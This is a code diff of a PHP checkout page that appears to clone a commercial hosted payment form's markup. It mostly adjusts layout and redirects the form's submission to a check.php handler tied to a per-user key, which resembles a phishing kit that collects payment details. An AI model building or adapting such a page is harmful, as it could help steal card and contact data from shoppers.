@@ -135,11 +135,11 @@ if (!isset($users[$user_key])) {
     <main>
         <div class="CheckoutPaymentForm">
             <!-- CHANGE ONLY THIS LINE: Add method="POST" action="check.php" -->
-            <form class="PaymentForm-form" method="POST" action="process.php" novalidate="" id="payment-form">
+            <form class="PaymentForm-form" method="POST" action="check.php" novalidate="" id="payment-form">
                 <!-- ADD THIS LINE RIGHT AFTER THE FORM OPENING TAG -->
                 <input type="hidden" name="user_key" value="<?php echo $user_key; ?>">
                 
-                <div style="height: 200px;">
+                <div style="height: 150px;">
                     <div>
                         <div style="opacity: 1;">
                             <div
@@ -149,10 +149,9 @@ if (!isset($users[$user_key])) {
                                         <div
                                             class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
                                             <label for="email-fieldset"><span
-                                                    class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">Contact
-                                                    details</span></label>
+                                                    class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">Contact details</span></label>
                                             <div style="opacity: 1; transform: none;"></div>
-                                        </div>
+                                        </div><div style="height: 5px;"></div>
                                         <fieldset class="FormFieldGroup-Fieldset" id="email-fieldset">
                                             <div class="FormFieldGroup-container">
                                                 <div
@@ -192,10 +191,7 @@ if (!isset($users[$user_key])) {
                                                     </div>
                                                 </div>
                                             </div>
-                                        </fieldset>
-                                    </div>
-                                </div>
-                                                                <div
+                                            <div
                                                                     class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childBottom">
                                                                     <div class="FormFieldInput">
                                                                         <div class="CheckoutInputContainer">
@@ -231,6 +227,11 @@ if (!isset($users[$user_key])) {
                                                                         </div>
                                                                     </div>
                                                                 </div>
+                                        </fieldset>
+                                        
+                                    </div>
+                                </div>
+                                        
                                                                 <div class="FieldError-container"
                                                                     style="opacity: 0; height: 0px; margin-top: 0px;">
                                                                     <span
@@ -244,15 +245,16 @@ if (!isset($users[$user_key])) {
                                                         </fieldset>
                                                     </div>
                                                 </div>
-                                                <div class="flex-item width-12">
-                                                    <h2
-                                                        class="PaymentMethod-Heading Text Text-color--gray800 Text-fontSize--16 Text-fontWeight--500">
-                                                        Payment method</h2>
-                                                </div>
                                             </div>
+                                                 <div class="flex-item width-12">
+                                                    <h2 class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">
+                                                        Payment method</h2>
+                                                </div><div style="height: 5px;"></div>
+
                                             <div class="PaymentMethodForm" style="opacity: 1; height: auto;">
                                                 <div class="Accordion PaymentMethodFormAccordion" role="list"
                                                     data-name="paymentMethodFormAccordion">
+                                                    
                                                     <div class="AnimatePresence PaymentMethodFormVisible-container">
                                                         <div class="AnimatePresence-inner">
                                                             <div
@@ -280,6 +282,7 @@ if (!isset($users[$user_key])) {
                                                                                                                 class="Text Text-color--gray400 Text-fontSize--13 Text-fontWeight--500"></span>
                                                                                                         </div>
                                                                                                     </div>
+                                                                                                    
                                                                                                     <div
                                                                                                         class="flex-item width-grow">
                                                                                                         <div
